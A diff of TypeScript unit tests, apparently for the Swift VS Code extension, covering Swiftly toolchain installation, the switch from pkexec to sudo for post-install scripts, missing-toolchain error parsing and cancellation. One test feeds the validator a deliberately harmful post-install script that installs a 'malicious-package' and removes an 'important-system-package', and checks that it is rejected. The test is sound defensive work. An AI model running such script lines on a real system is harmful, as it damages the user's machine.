                     await fs.writeFile(postInstallPath, invalidScript);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
             expect(mockVscodeWindow.showErrorMessage).to.have.been.calledWith(
                 match(
                     "Installation of Swift 6.0.0 requires additional system packages, but the post-install script contains commands that are not allowed for security reasons"
                 )
             );
             expect(mockVscodeWindow.showWarningMessage).to.not.have.been.called;
-            expect(mockUtilities.execFile).to.not.have.been.calledWith("pkexec", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.not.have.been.calledWith(
+                "sudo",
+                match.array
+            );
         });
 
         test("should handle post-install script execution errors", async () => {
             const validScript = `#!/bin/bash
 apt-get -y install build-essential`;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
                     await fs.writeFile(postInstallPath, validScript);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
             mockUtilities.execFile
                 .withArgs("chmod", match.array)
                 .resolves({ stdout: "", stderr: "" });
 
-            // Mock execFileStreamOutput for pkexec to throw error
-            mockUtilities.execFileStreamOutput.rejects(new Error("Permission denied"));
+            // Mock execFileStreamOutput for sudo to throw error
+            mockUtilities.execFileStreamOutput
+                .withArgs("sudo")
+                .rejects(new Error("Permission denied"));
 
             // @ts-expect-error mocking vscode window methods makes type checking difficult
             mockVscodeWindow.showWarningMessage.resolves("Execute Script");
+            mockVscodeWindow.showErrorMessage.resolves(undefined);
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
             expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                 match(
                     "Swift 6.0.0 installation requires additional system packages to be installed"
@@ -872,20 +1155,20 @@ apt-get -y install build-essential`;
         });
 
         test("should complete installation successfully when no post-install file exists", async () => {
-            mockUtilities.execFile.withArgs("swiftly").resolves({ stdout: "", stderr: "" });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
 
-            // Test doesn't need mock filesystem, just ensure it's clean
-            try {
-                mockFS.restore();
-            } catch {
-                // Ignore if not active
-            }
-
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
             expect(mockVscodeWindow.showWarningMessage).to.not.have.been.called;
             expect(mockVscodeWindow.showErrorMessage).to.not.have.been.called;
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
         });
 
         test("should validate yum-based post-install scripts", async () => {
@@ -893,31 +1176,30 @@ apt-get -y install build-essential`;
 yum install gcc-c++
 yum install ncurses-devel`;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
                     await fs.writeFile(postInstallPath, yumScript);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
             mockUtilities.execFile
                 .withArgs("chmod", match.array)
                 .resolves({ stdout: "", stderr: "" });
 
-            // Mock execFileStreamOutput for pkexec
-            mockUtilities.execFileStreamOutput.resolves();
+            // Mock execFileStreamOutput for sudo
+            mockUtilities.execFileStreamOutput.withArgs("sudo").resolves();
 
             // @ts-expect-error mocking vscode window methods makes type checking difficult
             mockVscodeWindow.showWarningMessage.resolves("Execute Script");
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
             expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                 match(
@@ -925,12 +1207,12 @@ yum install ncurses-devel`;
                 )
             );
             expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
-                "pkexec",
+                "sudo",
                 match.array,
                 match.any,
                 match.any,
                 null,
-                {}
+                match.object
             );
         });
 
@@ -939,24 +1221,30 @@ yum install ncurses-devel`;
 apt-get install --unsafe-flag malicious-package
 yum remove important-system-package`;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
                     await fs.writeFile(postInstallPath, malformedScript);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
-            expect(mockUtilities.execFile).to.have.been.calledWith("swiftly", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
+                "swiftly",
+                match.array,
+                match.any,
+                match.any,
+                match.any,
+                match.any
+            );
             expect(mockVscodeWindow.showErrorMessage).to.have.been.calledWith(
                 match(
                     "Installation of Swift 6.0.0 requires additional system packages, but the post-install script contains commands that are not allowed for security reasons"
@@ -973,31 +1261,30 @@ apt-get -y install libncurses5-dev
 
 `;
 
-            mockUtilities.execFile
+            mockUtilities.execFileStreamOutput
                 .withArgs("swiftly", [
                     "install",
                     "6.0.0",
-                    "--use",
                     "--assume-yes",
                     "--post-install-file",
                     match.string,
                 ])
                 .callsFake(async (_command, args) => {
-                    const postInstallPath = args[5];
+                    const postInstallPath = args[4];
                     await fs.writeFile(postInstallPath, scriptWithComments);
-                    return { stdout: "", stderr: "" };
+                    return;
                 });
             mockUtilities.execFile
                 .withArgs("chmod", match.array)
                 .resolves({ stdout: "", stderr: "" });
 
-            // Mock execFileStreamOutput for pkexec
-            mockUtilities.execFileStreamOutput.resolves();
+            // Mock execFileStreamOutput for sudo
+            mockUtilities.execFileStreamOutput.withArgs("sudo").resolves();
 
             // @ts-expect-error mocking vscode window methods makes type checking difficult
             mockVscodeWindow.showWarningMessage.resolves("Execute Script");
 
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
             expect(mockVscodeWindow.showWarningMessage).to.have.been.calledWith(
                 match(
@@ -1005,30 +1292,206 @@ apt-get -y install libncurses5-dev
                 )
             );
             expect(mockUtilities.execFileStreamOutput).to.have.been.calledWith(
-                "pkexec",
+                "sudo",
                 match.array,
                 match.any,
                 match.any,
                 null,
-                {}
+                match.object
             );
         });
 
         test("should skip post-install handling on macOS", async () => {
             mockedPlatform.setValue("darwin");
-            mockUtilities.execFile.withArgs("swiftly").resolves({ stdout: "", stderr: "" });
+            mockUtilities.execFileStreamOutput.withArgs("swiftly").resolves();
 
-            // Test doesn't need mock filesystem, just ensure it's clean
-            try {
-                mockFS.restore();
-            } catch {
-                // Ignore if not active
-            }
-
-            await Swiftly.installToolchain("6.0.0");
+            await Swiftly.installToolchain("6.0.0", "/path/to/extension");
 
             expect(mockVscodeWindow.showWarningMessage).to.not.have.been.called;
-            expect(mockUtilities.execFile).to.not.have.been.calledWith("pkexec", match.array);
+            expect(mockUtilities.execFileStreamOutput).to.not.have.been.calledWith(
+                "sudo",
+                match.array
+            );
+        });
+    });
+
+    suite("Missing Toolchain Handling", () => {
+        test("parseSwiftlyMissingToolchainError parses version correctly", () => {
+            const stderr =
+                "The swift version file uses toolchain version 6.1.2, but it doesn't match any of the installed toolchains. You can install the toolchain with `swiftly install`.";
+            const result = parseSwiftlyMissingToolchainError(stderr);
+            expect(result?.version).to.equal("6.1.2");
+            expect(result?.originalError).to.equal(stderr);
+        });
+
+        test("parseSwiftlyMissingToolchainError returns undefined for other errors", () => {
+            const stderr = "Some other error message";
+            const result = parseSwiftlyMissingToolchainError(stderr);
+            expect(result).to.be.undefined;
+        });
+
+        test("parseSwiftlyMissingToolchainError handles snapshot versions", () => {
+            const stderr =
+                "uses toolchain version 6.1-snapshot-2024-12-01, but it doesn't match any of the installed toolchains";
+            const result = parseSwiftlyMissingToolchainError(stderr);
+            expect(result?.version).to.equal("6.1-snapshot-2024-12-01");
+        });
+
+        test("parseSwiftlyMissingToolchainError handles versions with hyphens", () => {
+            const stderr =
+                "uses toolchain version 6.0-dev, but it doesn't match any of the installed toolchains";
+            const result = parseSwiftlyMissingToolchainError(stderr);
+            expect(result?.version).to.equal("6.0-dev");
+        });
+    });
+
+    suite("handleMissingSwiftlyToolchain", () => {
+        const mockWindow = mockGlobalObject(vscode, "window");
+        const mockedUtilities = mockGlobalModule(utilities);
+        const mockSwiftlyInstallToolchain = mockGlobalValue(Swiftly, "installToolchain");
+
+        test("handleMissingSwiftlyToolchain returns false when user declines installation", async () => {
+            mockWindow.showWarningMessage.resolves(undefined); // User cancels/declines
+            const result = await handleMissingSwiftlyToolchain("6.1.2", "/path/to/extension");
+            expect(result).to.be.false;
+        });
+
+        test("handleMissingSwiftlyToolchain returns true when user accepts and installation succeeds", async () => {
+            // User accepts the installation
+            mockWindow.showWarningMessage.resolves("Install Toolchain" as any);
+
+            // Mock successful installation with progress
+            mockWindow.withProgress.callsFake(async (_options, task) => {
+                const mockProgress = { report: () => {} };
+                const mockToken = {
+                    isCancellationRequested: false,
+                    onCancellationRequested: () => ({ dispose: () => {} }),
+                };
+                await task(mockProgress, mockToken);
+                return true;
+            });
+
+            mockSwiftlyInstallToolchain.setValue(() => Promise.resolve(void 0));
+
+            // Mock the installSwiftlyToolchainVersion to succeed
+            mockedUtilities.execFile
+                .withArgs("swiftly", match.any)
+                .resolves({ stdout: "", stderr: "" });
+
+            const result = await handleMissingSwiftlyToolchain("6.1.2", "/path/to/extension");
+            expect(result).to.be.true;
+        });
+    });
+
+    suite("Toolchain Installation Cancellation", () => {
+        const mockWindow = mockGlobalObject(vscode, "window");
+
+        test("installToolchain should handle cancellation during progress", async () => {
+            mockedPlatform.setValue("darwin");
+
+            // Mock a cancellation token that gets cancelled
+            const mockToken = {
+                isCancellationRequested: true,
+                onCancellationRequested: () => ({ dispose: () => {} }),
+            };
+
+            // Mock mkfifo to succeed
+            mockUtilities.execFile.withArgs("mkfifo").resolves({ stdout: "", stderr: "" });
+
+            // Mock swiftly install to throw cancellation error
+            mockUtilities.execFileStreamOutput
+                .withArgs("swiftly")
+                .rejects(new Error(Swiftly.cancellationMessage));
+
+            const progressCallback = () => {};
+
+            await expect(
+                Swiftly.installToolchain(
+                    "6.0.0",
+                    "/path/to/extension",
+                    progressCallback,
+                    undefined,
+                    mockToken as any
+                )
+            ).to.eventually.be.rejectedWith(Swiftly.cancellationMessage);
+        });
+
+        test("installToolchain should handle cancellation without progress callback", async () => {
+            mockedPlatform.setValue("darwin");
+
+            // Mock a cancellation token that gets cancelled
+            const mockToken = {
+                isCancellationRequested: true,
+                onCancellationRequested: () => ({ dispose: () => {} }),
+            };
+
+            // Mock swiftly install to throw cancellation error
+            mockUtilities.execFileStreamOutput
+                .withArgs("swiftly")
+                .rejects(new Error(Swiftly.cancellationMessage));
+
+            await expect(
+                Swiftly.installToolchain("6.0.0", "", undefined, undefined, mockToken)
+            ).to.eventually.be.rejectedWith(Swiftly.cancellationMessage);
+        });
+
+        test("installSwiftlyToolchainVersion should handle cancellation gracefully", async () => {
+            // Mock window.withProgress to simulate cancellation
+            mockWindow.withProgress.callsFake(async (_options, task) => {
+                const mockProgress = { report: () => {} };
+                const mockToken = {
+                    isCancellationRequested: true,
+                    onCancellationRequested: () => ({ dispose: () => {} }),
+                };
+
+                // Simulate the task throwing a cancellation error
+                try {
+                    await task(mockProgress, mockToken);
+                } catch (error) {
+                    if ((error as Error).message.includes(Swiftly.cancellationMessage)) {
+                        throw error;
+                    }
+                }
+            });
+
+            // Mock Swiftly.installToolchain to throw cancellation error
+            mockUtilities.execFileStreamOutput
+                .withArgs("swiftly")
+                .rejects(new Error(Swiftly.cancellationMessage));
+
+            const result = await installSwiftlyToolchainWithProgress("6.0.0", "/path/to/extension");
+
+            expect(result).to.be.false;
+            expect(mockWindow.showErrorMessage).to.not.have.been.called;
+        });
+
+        test("installSwiftlyToolchainVersion should show error for non-cancellation errors", async () => {
+            // Mock window.withProgress to simulate a regular error
+            mockWindow.withProgress.callsFake(async (_options, task) => {
+                const mockProgress = { report: () => {} };
+                const mockToken = {
+                    isCancellationRequested: false,
+                    onCancellationRequested: () => ({ dispose: () => {} }),
+                };
+
+                await task(mockProgress, mockToken);
+            });
+
+            // Mock Swiftly.installToolchain to throw a regular error
+            mockUtilities.execFileStreamOutput
+                .withArgs("swiftly")
+                .rejects(new Error("Network error"));
+
+            const result = await installSwiftlyToolchainWithProgress("6.0.0", "/path/to/extension");
+
+            expect(result).to.be.false;
+            expect(mockWindow.showErrorMessage).to.have.been.calledWith(
+                match("Failed to install Swift 6.0.0")
+            );
+        });
+
+        test("cancellationMessage should be properly defined", () => {
+            expect(Swiftly.cancellationMessage).to.equal("Installation cancelled by user");
         });
     });
 });
